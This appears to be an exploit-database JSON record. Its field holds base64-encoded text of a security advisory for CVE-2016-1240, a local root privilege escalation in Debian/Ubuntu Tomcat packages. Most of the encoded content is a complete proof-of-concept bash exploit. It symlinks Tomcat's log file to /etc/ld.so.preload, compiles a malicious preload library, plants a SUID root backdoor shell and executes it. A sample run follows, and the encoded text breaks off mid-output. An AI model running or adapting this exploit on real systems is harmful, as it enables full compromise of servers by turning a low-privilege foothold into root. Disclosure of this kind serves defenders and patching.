{
    "source": "exploit-database", 
    "exploit": "PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQotIERpc2NvdmVyZWQgYnk6IERhd2lkIEdvbHVuc2tpDQotIGh0dHA6Ly9sZWdhbGhhY2tlcnMuY29tDQotIGRhd2lkIChhdCkgbGVnYWxoYWNrZXJzLmNvbQ0KDQotIENWRS0yMDE2LTEyNDANCi0gUmVsZWFzZSBkYXRlOiAzMC4wOS4yMDE2DQotIFJldmlzaW9uOiAxDQotIFNldmVyaXR5OiBIaWdoDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCg0KDQpJLiBWVUxORVJBQklMSVRZDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCkFwYWNoZSBUb21jYXQgcGFja2FnaW5nIG9uIERlYmlhbi1iYXNlZCBkaXN0cm9zIC0gTG9jYWwgUm9vdCBQcml2aWxlZ2UgRXNjYWxhdGlvbg0KDQpBZmZlY3RlZCBkZWJpYW4gcGFja2FnZXM6DQoNClRvbWNhdCA4IDw9IDguMC4zNi0yIA0KVG9tY2F0IDcgPD0gNy4wLjcwLTIgICAgICANClRvbWNhdCA2IDw9IDYuMC40NStkZnNnLTF+ZGViOHUxDQoNClVidW50dSBzeXN0ZW1zIGFyZSBhbHNvIGFmZmVjdGVkLiBTZWUgc2VjdGlvbiBWSUkuIGZvciBkZXRhaWxzLg0KT3RoZXIgc3lzdGVtcyB1c2luZyB0aGUgYWZmZWN0ZWQgZGViaWFuIHBhY2thZ2VzIG1heSBhbHNvIGJlIGFmZmVjdGVkLg0KDQoNCklJLiBCQUNLR1JPVU5EDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiJUaGUgQXBhY2hlIFRvbWNhdMOCwq4gc29mdHdhcmUgaXMgYW4gb3BlbiBzb3VyY2UgaW1wbGVtZW50YXRpb24gb2YgdGhlIA0KSmF2YSBTZXJ2bGV0LCBKYXZhU2VydmVyIFBhZ2VzLCBKYXZhIEV4cHJlc3Npb24gTGFuZ3VhZ2UgYW5kIEphdmEgV2ViU29ja2V0IA0KdGVjaG5vbG9naWVzLiBUaGUgSmF2YSBTZXJ2bGV0LCBKYXZhU2VydmVyIFBhZ2VzLCBKYXZhIEV4cHJlc3Npb24gTGFuZ3VhZ2UgDQphbmQgSmF2YSBXZWJTb2NrZXQgc3BlY2lmaWNhdGlvbnMgYXJlIGRldmVsb3BlZCB1bmRlciB0aGUgSmF2YSBDb21tdW5pdHkgDQpQcm9jZXNzLg0KDQpUaGUgQXBhY2hlIFRvbWNhdCBzb2Z0d2FyZSBpcyBkZXZlbG9wZWQgaW4gYW4gb3BlbiBhbmQgcGFydGljaXBhdG9yeSANCmVudmlyb25tZW50IGFuZCByZWxlYXNlZCB1bmRlciB0aGUgQXBhY2hlIExpY2Vuc2UgdmVyc2lvbiAyLiANClRoZSBBcGFjaGUgVG9tY2F0IHByb2plY3QgaXMgaW50ZW5kZWQgdG8gYmUgYSBjb2xsYWJvcmF0aW9uIG9mIHRoZSANCmJlc3Qtb2YtYnJlZWQgZGV2ZWxvcGVycyBmcm9tIGFyb3VuZCB0aGUgd29ybGQuDQoNCkFwYWNoZSBUb21jYXQgc29mdHdhcmUgcG93ZXJzIG51bWVyb3VzIGxhcmdlLXNjYWxlLCBtaXNzaW9uLWNyaXRpY2FsIHdlYiANCmFwcGxpY2F0aW9ucyBhY3Jvc3MgYSBkaXZlcnNlIHJhbmdlIG9mIGluZHVzdHJpZXMgYW5kIG9yZ2FuaXphdGlvbnMuIA0KU29tZSBvZiB0aGVzZSB1c2VycyBhbmQgdGhlaXIgc3RvcmllcyBhcmUgbGlzdGVkIG9uIHRoZSBQb3dlcmVkQnkgd2lraSBwYWdlLg0KIg0KDQpodHRwOi8vdG9tY2F0LmFwYWNoZS5vcmcvDQoNCg0KSUlJLiBJTlRST0RVQ1RJT04NCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KVG9tY2F0ICg2LCA3LCA4KSBwYWNrYWdlcyBwcm92aWRlZCBieSBkZWZhdWx0IHJlcG9zaXRvcmllcyBvbiBEZWJpYW4tYmFzZWQgDQpkaXN0cmlidXRpb25zIChpbmNsdWRpbmcgRGViaWFuLCBVYnVudHUgZXRjLikgcHJvdmlkZSBhIHZ1bG5lcmFibGUNCnRvbWNhdCBpbml0IHNjcmlwdCB0aGF0IGFsbG93cyBsb2NhbCBhdHRhY2tlcnMgd2hvIGhhdmUgYWxyZWFkeSBnYWluZWQgYWNjZXNzIA0KdG8gdGhlIHRvbWNhdCBhY2NvdW50IChmb3IgZXhhbXBsZSwgYnkgZXhwbG9pdGluZyBhbiBSQ0UgdnVsbmVyYWJpbGl0eQ0KaW4gYSBqYXZhIHdlYiBhcHBsaWNhdGlvbiBob3N0ZWQgb24gVG9tY2F0LCB1cGxvYWRpbmcgYSB3ZWJzaGVsbCBldGMuKSB0bw0KZXNjYWxhdGUgdGhlaXIgcHJpdmlsZWdlcyBmcm9tIHRvbWNhdCB1c2VyIHRvIHJvb3QgYW5kIGZ1bGx5IGNvbXByb21pc2UgdGhlIA0KdGFyZ2V0IHN5c3RlbS4NCg0KSVYuIERFU0NSSVBUSU9ODQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNClRoZSB2dWxuZXJhYmlsaXR5IGlzIGxvY2F0ZWQgaW4gdGhlIHRvbWNhdCBpbml0IHNjcmlwdCBwcm92aWRlZCBieSBhZmZlY3RlZA0KcGFja2FnZXMsIG5vcm1hbGx5IGluc3RhbGxlZCBhdCAvZXRjL2luaXQuZC90b21jYXROLiANCg0KVGhlIHNjcmlwdCBmb3IgdG9tY2F0NyBjb250YWlucyB0aGUgZm9sbG93aW5nIGxpbmVzOg0KDQotLS0tLVt0b21jYXQ3XS0tLS0NCg0KIyBSdW4gdGhlIGNhdGFsaW5hLnNoIHNjcmlwdCBhcyBhIGRhZW1vbg0Kc2V0ICtlDQp0b3VjaCAiJENBVEFMSU5BX1BJRCIgIiRDQVRBTElOQV9CQVNFIi9sb2dzL2NhdGFsaW5hLm91dA0KY2hvd24gJFRPTUNBVDdfVVNFUiAiJENBVEFMSU5BX1BJRCIgIiRDQVRBTElOQV9CQVNFIi9sb2dzL2NhdGFsaW5hLm91dA0KDQotLS0tLS0tW2VvZl0tLS0tLS0NCg0KTG9jYWwgYXR0YWNrZXJzIHdobyBoYXZlIGdhaW5lZCBhY2Nlc3MgdG8gdGhlIHNlcnZlciBpbiB0aGUgY29udGV4dCBvZiB0aGUNCnRvbWNhdCB1c2VyIChmb3IgZXhhbXBsZSwgdGhyb3VnaCBhIHZ1bG5lcmFiaWxpdHkgaW4gYSB3ZWIgYXBwbGljYXRpb24pIHdvdWxkIA0KYmUgYWJsZSB0byByZXBsYWNlIHRoZSBsb2cgZmlsZSB3aXRoIGEgc3ltbGluayB0byBhbiBhcmJpdHJhcnkgc3lzdGVtIGZpbGUgDQphbmQgZXNjYWxhdGUgdGhlaXIgcHJpdmlsZWdlcyB0byByb290IG9uY2UgVG9tY2F0IGluaXQgc2NyaXB0IChydW5uaW5nIGFzIHJvb3QpDQpyZS1vcGVucyB0aGUgY2F0YWxpbmEub3V0IGZpbGUgYWZ0ZXIgYSBzZXJ2aWNlIHJlc3RhcnQsIHJlYm9vdCBldGMuDQoNCkFzIGF0dGFja2VycyB3b3VsZCBhbHJlYWR5IGhhdmUgYSB0b21jYXQgYWNjb3VudCBhdCB0aGUgdGltZSBvZiBleHBsb2l0YXRpb24sDQp0aGV5IGNvdWxkIGFsc28ga2lsbCB0aGUgdG9tY2F0IHByb2Nlc3NlcyB0byBpbnRyb2R1Y2UgdGhlIG5lZWQgZm9yIGEgcmVzdGFydC4NCg0KDQpWLiBQUk9PRiBPRiBDT05DRVBUIEVYUExPSVQNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KLS0tLS0tWyB0b21jYXQtcm9vdHByaXZlc2MtZGViLnNoIF0tLS0tLS0NCg0KIyEvYmluL2Jhc2gNCiMNCiMgVG9tY2F0IDYvNy84IG9uIERlYmlhbi1iYXNlZCBkaXN0cm9zIC0gTG9jYWwgUm9vdCBQcml2aWxlZ2UgRXNjYWxhdGlvbiBFeHBsb2l0DQojDQojIENWRS0yMDE2LTEyNDANCiMNCiMgRGlzY292ZXJlZCBhbmQgY29kZWQgYnk6DQojDQojIERhd2lkIEdvbHVuc2tpDQojIGh0dHA6Ly9sZWdhbGhhY2tlcnMuY29tDQojDQojIFRoaXMgZXhwbG9pdCB0YXJnZXRzIFRvbWNhdCAodmVyc2lvbnMgNiwgNyBhbmQgOCkgcGFja2FnaW5nIG9uIA0KIyBEZWJpYW4tYmFzZWQgZGlzdHJvcyBpbmNsdWRpbmcgRGViaWFuLCBVYnVudHUgZXRjLg0KIyBJdCBhbGxvd3MgYXR0YWNrZXJzIHdpdGggYSB0b21jYXQgc2hlbGwgKGUuZy4gb2J0YWluZWQgcmVtb3RlbHkgdGhyb3VnaCBhIA0KIyB2dWxuZXJhYmxlIGphdmEgd2ViYXBwLCBvciBsb2NhbGx5IHZpYSB3ZWFrIHBlcm1pc3Npb25zIG9uIHdlYmFwcHMgaW4gdGhlIA0KIyBUb21jYXQgd2Vicm9vdCBkaXJlY3RvcmllcyBldGMuKSB0byBlc2NhbGF0ZSB0aGVpciBwcml2aWxlZ2VzIHRvIHJvb3QuDQojDQojIFVzYWdlOg0KIyAuL3RvbWNhdC1yb290cHJpdmVzYy1kZWIuc2ggcGF0aF90b19jYXRhbGluYS5vdXQgWy1kZWZlcnJlZF0NCiMNCiMgVGhlIGV4cGxvaXQgY2FuIHVzZWQgaW4gdHdvIHdheXM6DQojDQojIC1hY3RpdmUgKGFzc3VtZWQgYnkgZGVmYXVsdCkgLSB3aGljaCB3YWl0cyBmb3IgYSBUb21jYXQgcmVzdGFydCBpbiBhIGxvb3AgYW5kIGluc3RhbnRseQ0KIyBnYWlucy9leGVjdXRlcyBhIHJvb3RzaGVsbCB2aWEgbGQuc28ucHJlbG9hZCBhcyBzb29uIGFzIFRvbWNhdCBzZXJ2aWNlIGlzIHJlc3RhcnRlZC4gDQojIEl0IGFsc28gZ2l2ZXMgYXR0YWNrZXIgYSBjaGFuY2UgdG8gZXhlY3V0ZToga2lsbCBbdG9tY2F0LXBpZF0gY29tbWFuZCB0byBmb3JjZS9zcGVlZCB1cA0KIyBhIFRvbWNhdCByZXN0YXJ0IChkb25lIG1hbnVhbGx5IGJ5IGFuIGFkbWluLCBvciBwb3RlbnRpYWxseSBieSBzb21lIHRvbWNhdCBzZXJ2aWNlIHdhdGNoZG9nIGV0Yy4pDQojDQojIC1kZWZlcnJlZCAocmVxdWlyZXMgdGhlIC1kZWZlcnJlZCBzd2l0Y2ggb24gYXJndlsyXSkgLSB0aGlzIG1vZGUgc3ltbGlua3MgdGhlIGxvZ2ZpbGUgdG8gDQojIC9ldGMvZGVmYXVsdC9sb2NhbGUgYW5kIGV4aXRzLiBJdCByZW1vdmVzIHRoZSBuZWVkIGZvciB0aGUgZXhwbG9pdCB0byBydW4gaW4gYSBsb29wIHdhaXRpbmcuIA0KIyBBdHRhY2tlcnMgY2FuIGNvbWUgYmFjayBhdCBhIGxhdGVyIHRpbWUgYW5kIGNoZWNrIG9uIHRoZSAvZXRjL2RlZmF1bHQvbG9jYWxlIGZpbGUuIFVwb24gYSANCiMgVG9tY2F0IHJlc3RhcnQgLyBzZXJ2ZXIgcmVib290LCB0aGUgZmlsZSBzaG91bGQgYmUgb3duZWQgYnkgdG9tY2F0IHVzZXIuIFRoZSBhdHRhY2tlcnMgY2FuDQojIHRoZW4gYWRkIGFyYml0cmFyeSBjb21tYW5kcyB0byB0aGUgZmlsZSB3aGljaCB3aWxsIGJlIGV4ZWN1dGVkIHdpdGggcm9vdCBwcml2aWxlZ2VzIGJ5IA0KIyB0aGUgL2V0Yy9jcm9uLmRhaWx5L3RvbWNhdE4gbG9ncm90YXRpb24gY3JvbmpvYiAocnVuIGRhaWx5IGFyb3VuZCA2OjI1YW0gb24gZGVmYXVsdCANCiMgVWJ1bnR1L0RlYmlhbiBUb21jYXQgaW5zdGFsbGF0aW9ucykuDQojDQojIFNlZSBmdWxsIGFkdmlzb3J5IGZvciBkZXRhaWxzIGF0Og0KIyBodHRwOi8vbGVnYWxoYWNrZXJzLmNvbS9hZHZpc29yaWVzL1RvbWNhdC1EZWJQa2dzLVJvb3QtUHJpdmlsZWdlLUVzY2FsYXRpb24tRXhwbG9pdC1DVkUtMjAxNi0xMjQwLmh0bWwNCiMNCiMgRGlzY2xhaW1lcjoNCiMgRm9yIHRlc3RpbmcgcHVycG9zZXMgb25seS4gRG8gbm8gaGFybS4NCiMNCg0KQkFDS0RPT1JTSD0iL2Jpbi9iYXNoIg0KQkFDS0RPT1JQQVRIPSIvdG1wL3RvbWNhdHJvb3RzaCINClBSSVZFU0NMSUI9Ii90bXAvcHJpdmVzY2xpYi5zbyINClBSSVZFU0NTUkM9Ii90bXAvcHJpdmVzY2xpYi5jIg0KU1VJREJJTj0iL3Vzci9iaW4vc3VkbyINCg0KZnVuY3Rpb24gY2xlYW5leGl0IHsNCgkjIENsZWFudXAgDQoJZWNobyAtZSAiXG5bK10gQ2xlYW5pbmcgdXAuLi4iDQoJcm0gLWYgJFBSSVZFU0NTUkMNCglybSAtZiAkUFJJVkVTQ0xJQg0KCXJtIC1mICRUT01DQVRMT0cNCgl0b3VjaCAkVE9NQ0FUTE9HDQoJaWYgWyAtZiAvZXRjL2xkLnNvLnByZWxvYWQgXTsgdGhlbg0KCQllY2hvIC1uID4gL2V0Yy9sZC5zby5wcmVsb2FkIDI+L2Rldi9udWxsDQoJZmkNCgllY2hvIC1lICJcblsrXSBKb2IgZG9uZS4gRXhpdGluZyB3aXRoIGNvZGUgJDEgXG4iDQoJZXhpdCAkMQ0KfQ0KDQpmdW5jdGlvbiBjdHJsX2MoKSB7DQogICAgICAgIGVjaG8gLWUgIlxuWytdIEFjdGl2ZSBleHBsb2l0YXRpb24gYWJvcnRlZC4gUmVtZW1iZXIgeW91IGNhbiB1c2UgLWRlZmVycmVkIHN3aXRjaCBmb3IgZGVmZXJyZWQgZXhwbG9pdGF0aW9uLiINCgljbGVhbmV4aXQgMA0KfQ0KDQojaW50cm8gDQplY2hvIC1lICJcMDMzWzk0bSBcblRvbWNhdCA2LzcvOCBvbiBEZWJpYW4tYmFzZWQgZGlzdHJvcyAtIExvY2FsIFJvb3QgUHJpdmlsZWdlIEVzY2FsYXRpb24gRXhwbG9pdFxuQ1ZFLTIwMTYtMTI0MFxuIg0KZWNobyAtZSAiRGlzY292ZXJlZCBhbmQgY29kZWQgYnk6IFxuXG5EYXdpZCBHb2x1bnNraSBcbmh0dHA6Ly9sZWdhbGhhY2tlcnMuY29tIFwwMzNbMG0iDQoNCiMgQXJncw0KaWYgWyAkIyAtbHQgMSBdOyB0aGVuDQoJZWNobyAtZSAiXG5bIV0gRXhwbG9pdCB1c2FnZTogXG5cbiQwIHBhdGhfdG9fY2F0YWxpbmEub3V0IFstZGVmZXJyZWRdXG4iDQoJZXhpdCAzDQpmaQ0KaWYgWyAiJDIiID0gIi1kZWZlcnJlZCIgXTsgdGhlbg0KCW1vZGU9ImRlZmVycmVkIg0KZWxzZQ0KCW1vZGU9ImFjdGl2ZSINCmZpDQoNCiMgUHJpdiBjaGVjaw0KZWNobyAtZSAiXG5bK10gU3RhcnRpbmcgdGhlIGV4cGxvaXQgaW4gW1wwMzNbOTRtJG1vZGVcMDMzWzBtXSBtb2RlIHdpdGggdGhlIGZvbGxvd2luZyBwcml2aWxlZ2VzOiBcbmBpZGAiDQppZCB8IGdyZXAgLXEgdG9tY2F0DQppZiBbICQ/IC1uZSAwIF07IHRoZW4NCgllY2hvIC1lICJcblshXSBZb3UgbmVlZCB0byBleGVjdXRlIHRoZSBleHBsb2l0IGFzIHRvbWNhdCB1c2VyISBFeGl0aW5nLlxuIg0KCWV4aXQgMw0KZmkNCg0KIyBTZXQgdGFyZ2V0IHBhdGhzDQpUT01DQVRMT0c9IiQxIg0KaWYgWyAhIC1mICRUT01DQVRMT0cgXTsgdGhlbg0KCWVjaG8gLWUgIlxuWyFdIFRoZSBzcGVjaWZpZWQgVG9tY2F0IGNhdGFsaW5hLm91dCBsb2cgKCRUT01DQVRMT0cpIGRvZXNuJ3QgZXhpc3QuIFRyeSBhZ2Fpbi5cbiINCglleGl0IDMNCmZpDQplY2hvIC1lICJcblsrXSBUYXJnZXQgVG9tY2F0IGxvZyBmaWxlIHNldCB0byAkVE9NQ0FUTE9HIg0KDQojIFsgRGVmZXJyZWQgZXhwbG9pdGF0aW9uIF0NCg0KIyBTeW1saW5rIHRoZSBsb2cgZmlsZSB0byAvZXRjL2RlZmF1bHQvbG9jYWxlIGZpbGUgd2hpY2ggZ2V0cyBleGVjdXRlZCBkYWlseSBvbiBkZWZhdWx0DQojIHRvbWNhdCBpbnN0YWxsYXRpb25zIG9uIERlYmlhbi9VYnVudHUgYnkgdGhlIC9ldGMvY3Jvbi5kYWlseS90b21jYXROIGxvZ3JvdGF0aW9uIGNyb25qb2IgYXJvdW5kIDY6MjVhbS4NCiMgQXR0YWNrZXJzIGNhbiBmcmVlbHkgYWRkIHRoZWlyIGNvbW1hbmRzIHRvIHRoZSAvZXRjL2RlZmF1bHQvbG9jYWxlIHNjcmlwdCBhZnRlciBUb21jYXQgaGFzIGJlZW4NCiMgcmVzdGFydGVkIGFuZCBmaWxlIG93bmVyIGdldHMgY2hhbmdlZC4NCmlmIFsgIiRtb2RlIiA9ICJkZWZlcnJlZCIgXTsgdGhlbg0KCXJtIC1mICRUT01DQVRMT0cgJiYgbG4gLXMgL2V0Yy9kZWZhdWx0L2xvY2FsZSAkVE9NQ0FUTE9HDQoJaWYgWyAkPyAtbmUgMCBdOyB0aGVuDQoJCWVjaG8gLWUgIlxuWyFdIENvdWxkbid0IHJlbW92ZSB0aGUgJFRPTUNBVExPRyBmaWxlIG9yIGNyZWF0ZSBhIHN5bWxpbmsuIg0KCQljbGVhbmV4aXQgMw0KCWZpDQoJZWNobyAtZSAgIlxuWytdIFN5bWxpbmsgY3JlYXRlZCBhdDogXG5gbHMgLWwgJFRPTUNBVExPR2AiDQoJZWNobyAtZSAgIlxuWytdIFRoZSBjdXJyZW50IG93bmVyIG9mIHRoZSBmaWxlIGlzOiBcbmBscyAtbCAvZXRjL2RlZmF1bHQvbG9jYWxlYCINCgllY2hvIC1uZSAiXG5bK10gS2VlcCBhbiBleWUgb24gdGhlIG93bmVyIGNoYW5nZSBvbiAvZXRjL2RlZmF1bHQvbG9jYWxlIC4gQWZ0ZXIgdGhlIFRvbWNhdCByZXN0YXJ0IC8gc3lzdGVtIHJlYm9vdCINCgllY2hvIC1uZSAiXG4gICAgeW91J2xsIGJlIGFibGUgdG8gYWRkIGFyYml0cmFyeSBjb21tYW5kcyB0byB0aGUgZmlsZSB3aGljaCB3aWxsIGdldCBleGVjdXRlZCB3aXRoIHJvb3QgcHJpdmlsZWdlcyINCgllY2hvIC1uZSAiXG4gICAgYXQgfjY6MjVhbSBieSB0aGUgL2V0Yy9jcm9uLmRhaWx5L3RvbWNhdE4gbG9nIHJvdGF0aW9uIGNyb24uIFNlZSBhbHNvIC1hY3RpdmUgbW9kZSBpZiB5b3UgY2FuJ3Qgd2FpdCA7KVxuXG4iDQoJZXhpdCAwDQpmaQ0KDQojIFsgQWN0aXZlIGV4cGxvaXRhdGlvbiBdDQoNCnRyYXAgY3RybF9jIElOVA0KIyBDb21waWxlIHByaXZlc2MgcHJlbG9hZCBsaWJyYXJ5DQplY2hvIC1lICJcblsrXSBDb21waWxpbmcgdGhlIHByaXZlc2Mgc2hhcmVkIGxpYnJhcnkgKCRQUklWRVNDU1JDKSINCmNhdCA8PF9zb2xpYmVvZl8+JFBSSVZFU0NTUkMNCiNkZWZpbmUgX0dOVV9TT1VSQ0UNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8ZGxmY24uaD4NCnVpZF90IGdldGV1aWQodm9pZCkgew0KCXN0YXRpYyB1aWRfdCAgKCpvbGRfZ2V0ZXVpZCkoKTsNCglvbGRfZ2V0ZXVpZCA9IGRsc3ltKFJUTERfTkVYVCwgImdldGV1aWQiKTsNCglpZiAoIG9sZF9nZXRldWlkKCkgPT0gMCApIHsNCgkJY2hvd24oIiRCQUNLRE9PUlBBVEgiLCAwLCAwKTsNCgkJY2htb2QoIiRCQUNLRE9PUlBBVEgiLCAwNDc3Nyk7DQoJCXVubGluaygiL2V0Yy9sZC5zby5wcmVsb2FkIik7DQoJfQ0KCXJldHVybiBvbGRfZ2V0ZXVpZCgpOw0KfQ0KX3NvbGliZW9mXw0KZ2NjIC1XYWxsIC1mUElDIC1zaGFyZWQgLW8gJFBSSVZFU0NMSUIgJFBSSVZFU0NTUkMgLWxkbA0KaWYgWyAkPyAtbmUgMCBdOyB0aGVuDQoJZWNobyAtZSAiXG5bIV0gRmFpbGVkIHRvIGNvbXBpbGUgdGhlIHByaXZlc2MgbGliICRQUklWRVNDU1JDLiINCgljbGVhbmV4aXQgMjsNCmZpDQoNCiMgUHJlcGFyZSBiYWNrZG9vciBzaGVsbA0KY3AgJEJBQ0tET09SU0ggJEJBQ0tET09SUEFUSA0KZWNobyAtZSAiXG5bK10gQmFja2Rvb3IvbG93LXByaXYgc2hlbGwgaW5zdGFsbGVkIGF0OiBcbmBscyAtbCAkQkFDS0RPT1JQQVRIYCINCg0KIyBTYWZldHkgY2hlY2sNCmlmIFsgLWYgL2V0Yy9sZC5zby5wcmVsb2FkIF07IHRoZW4NCgllY2hvIC1lICJcblshXSAvZXRjL2xkLnNvLnByZWxvYWQgYWxyZWFkeSBleGlzdHMuIEV4aXRpbmcgZm9yIHNhZmV0eS4iDQoJY2xlYW5leGl0IDINCmZpDQoNCiMgU3ltbGluayB0aGUgbG9nIGZpbGUgdG8gbGQuc28ucHJlbG9hZA0Kcm0gLWYgJFRPTUNBVExPRyAmJiBsbiAtcyAvZXRjL2xkLnNvLnByZWxvYWQgJFRPTUNBVExPRw0KaWYgWyAkPyAtbmUgMCBdOyB0aGVuDQoJZWNobyAtZSAiXG5bIV0gQ291bGRuJ3QgcmVtb3ZlIHRoZSAkVE9NQ0FUTE9HIGZpbGUgb3IgY3JlYXRlIGEgc3ltbGluay4iDQoJY2xlYW5leGl0IDMNCmZpDQplY2hvIC1lICJcblsrXSBTeW1saW5rIGNyZWF0ZWQgYXQ6IFxuYGxzIC1sICRUT01DQVRMT0dgIg0KDQojIFdhaXQgZm9yIFRvbWNhdCB0byByZS1vcGVuIHRoZSBsb2dzDQplY2hvIC1uZSAiXG5bK10gV2FpdGluZyBmb3IgVG9tY2F0IHRvIHJlLW9wZW4gdGhlIGxvZ3MvVG9tY2F0IHNlcnZpY2UgcmVzdGFydC4uLiINCmVjaG8gLWUgICJcbllvdSBjb3VsZCBzcGVlZCB0aGluZ3MgdXAgYnkgZXhlY3V0aW5nIDoga2lsbCBbVG9tY2F0LXBpZF0gKGFzIHRvbWNhdCB1c2VyKSBpZiBuZWVkZWQgOykiDQp3aGlsZSA6OyBkbyANCglzbGVlcCAwLjENCglpZiBbIC1mIC9ldGMvbGQuc28ucHJlbG9hZCBdOyB0aGVuDQoJCWVjaG8gJFBSSVZFU0NMSUIgPiAvZXRjL2xkLnNvLnByZWxvYWQNCgkJYnJlYWs7DQoJZmkNCmRvbmUNCg0KIyAvZXRjL2xkLnNvLnByZWxvYWQgZmlsZSBzaG91bGQgYmUgb3duZWQgYnkgdG9tY2F0IHVzZXIgYXQgdGhpcyBwb2ludA0KIyBJbmplY3QgdGhlIHByaXZlc2Muc28gc2hhcmVkIGxpYnJhcnkgdG8gZXNjYWxhdGUgcHJpdmlsZWdlcw0KZWNobyAkUFJJVkVTQ0xJQiA+IC9ldGMvbGQuc28ucHJlbG9hZA0KZWNobyAtZSAiXG5bK10gVG9tY2F0IHJlc3RhcnRlZC4gVGhlIC9ldGMvbGQuc28ucHJlbG9hZCBmaWxlIGdvdCBjcmVhdGVkIHdpdGggdG9tY2F0IHByaXZpbGVnZXM6IFxuYGxzIC1sIC9ldGMvbGQuc28ucHJlbG9hZGAiDQplY2hvIC1lICJcblsrXSBBZGRpbmcgJFBSSVZFU0NMSUIgc2hhcmVkIGxpYiB0byAvZXRjL2xkLnNvLnByZWxvYWQiDQplY2hvIC1lICJcblsrXSBUaGUgL2V0Yy9sZC5zby5wcmVsb2FkIGZpbGUgbm93IGNvbnRhaW5zOiBcbmBjYXQgL2V0Yy9sZC5zby5wcmVsb2FkYCINCg0KIyBFc2NhbGF0aW5nIHByaXZpbGVnZXMgdmlhIHRoZSBTVUlEIGJpbmFyeSAoZS5nLiAvdXNyL2Jpbi9zdWRvKQ0KZWNobyAtZSAiXG5bK10gRXNjYWxhdGluZyBwcml2aWxlZ2VzIHZpYSB0aGUgJFNVSURCSU4gU1VJRCBiaW5hcnkgdG8gZ2V0IHJvb3QhIg0Kc3VkbyAtLWhlbHAgMj4vZGV2L251bGwgPi9kZXYvbnVsbA0KDQojIENoZWNrIGZvciB0aGUgcm9vdHNoZWxsDQpscyAtbCAkQkFDS0RPT1JQQVRIIHwgZ3JlcCByd3MgfCBncmVwIC1xIHJvb3QNCmlmIFsgJD8gLWVxIDAgXTsgdGhlbiANCgllY2hvIC1lICJcblsrXSBSb290c2hlbGwgZ290IGFzc2lnbmVkIHJvb3QgU1VJRCBwZXJtcyBhdDogXG5gbHMgLWwgJEJBQ0tET09SUEFUSGAiDQoJZWNobyAtZSAiXG5cMDMzWzk0bVBsZWFzZSB0ZWxsIG1lIHlvdSdyZSBzZWVpbmcgdGhpcyB0b28gOykgXDAzM1swbSINCmVsc2UNCgllY2hvIC1lICJcblshXSBGYWlsZWQgdG8gZ2V0IHJvb3QiDQoJY2xlYW5leGl0IDINCmZpDQoNCiMgRXhlY3V0ZSB0aGUgcm9vdHNoZWxsDQplY2hvIC1lICJcblsrXSBFeGVjdXRpbmcgdGhlIHJvb3RzaGVsbCAkQkFDS0RPT1JQQVRIIG5vdyEgXG4iDQokQkFDS0RPT1JQQVRIIC1wIC1jICJybSAtZiAvZXRjL2xkLnNvLnByZWxvYWQ7IHJtIC1mICRQUklWRVNDTElCIg0KJEJBQ0tET09SUEFUSCAtcA0KDQojIEpvYiBkb25lLg0KY2xlYW5leGl0IDANCg0KLS0tLS0tLS0tLS0tLS1bIEVPRiBdLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KDQoNCkV4YW1wbGUgZXhwbG9pdCBydW46DQp+fn5+fn5+fn5+fn5+fg0KDQp0b21jYXQ3QHVidW50dTovdG1wJCBpZA0KdWlkPTExMCh0b21jYXQ3KSBnaWQ9MTE4KHRvbWNhdDcpIGdyb3Vwcz0xMTgodG9tY2F0NykNCg0KdG9tY2F0N0B1YnVudHU6L3RtcCQgbHNiX3JlbGVhc2UgLWENCk5vIExTQiBtb2R1bGVzIGFyZSBhdmFpbGFibGUuDQpEaXN0cmlidXRvciBJRDoJVWJ1bnR1DQpEZXNjcmlwdGlvbjoJVWJ1bnR1IDE2LjA0IExUUw0KUmVsZWFzZToJMTYuMDQNCkNvZGVuYW1lOgl4ZW5pYWwNCg0KdG9tY2F0N0B1YnVudHU6L3RtcCQgZHBrZyAtbCB8IGdyZXAgdG9tY2F0DQppaSAgbGlidG9tY2F0Ny1qYXZhICAgICAgICAgICAgICA3LjAuNjgtMXVidW50dTAuMSAgICAgICAgICAgICAgIGFsbCAgICAgICAgICBTZXJ2bGV0IGFuZCBKU1AgZW5naW5lIC0tIGNvcmUgbGlicmFyaWVzDQppaSAgdG9tY2F0NyAgICAgICAgICAgICAgICAgICAgICA3LjAuNjgtMXVidW50dTAuMSAgICAgICAgICAgICAgIGFsbCAgICAgICAgICBTZXJ2bGV0IGFuZCBKU1AgZW5naW5lDQppaSAgdG9tY2F0Ny1jb21tb24gICAgICAgICAgICAgICA3LjAuNjgtMXVidW50dTAuMSAgICAgICAgICAgICAgIGFsbCAgICAgICAgICBTZXJ2bGV0IGFuZCBKU1AgZW5naW5lIC0tIGNvbW1vbiBmaWxlcw0KDQp0b21jYXQ3QHVidW50dTovdG1wJCAuL3RvbWNhdC1yb290cHJpdmVzYy1kZWIuc2ggL3Zhci9sb2cvdG9tY2F0Ny9jYXRhbGluYS5vdXQgDQogDQpUb21jYXQgNi83Lzggb24gRGViaWFuLWJhc2VkIGRpc3Ryb3MgLSBMb2NhbCBSb290IFByaXZpbGVnZSBFc2NhbGF0aW9uIEV4cGxvaXQNCkNWRS0yMDE2LTEyNDANCg0KRGlzY292ZXJlZCBhbmQgY29kZWQgYnk6IA0KDQpEYXdpZCBHb2x1bnNraSANCmh0dHA6Ly9sZWdhbGhhY2tlcnMuY29tIA0KDQpbK10gU3RhcnRpbmcgdGhlIGV4cGxvaXQgaW4gW2FjdGl2ZV0gbW9kZSB3aXRoIHRoZSBmb2xsb3dpbmcgcHJpdmlsZWdlczogDQp1aWQ9MTEwKHRvbWNhdDcpIGdpZD0xMTgodG9tY2F0NykgZ3JvdXBzPTExOCh0b21jYXQ3KQ0KDQpbK10gVGFyZ2V0IFRvbWNhdCBsb2cgZmlsZSBzZXQgdG8gL3Zhci9sb2cvdG9tY2F0Ny9jYXRhbGluYS5vdXQNCg0KWytdIENvbXBpbGluZyB0aGUgcHJpdmVzYyBzaGFyZWQgbGlicmFyeSAoL3RtcC9wcml2ZXNjbGliLmMpDQoNClsr